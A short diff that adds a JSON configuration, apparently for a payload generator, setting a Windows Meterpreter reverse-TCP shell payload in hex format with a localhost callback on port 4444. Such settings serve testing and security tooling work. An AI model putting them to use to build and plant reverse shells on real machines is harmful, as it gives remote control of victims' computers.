@@ -1,0 +1,4 @@
+{
+	"args":{ "-p":"windows/meterpreter/reverse_tcp", "-f": "hex"},
+	"env": { "LHOST": "127.0.0.1", "LPORT": 4444}
+}
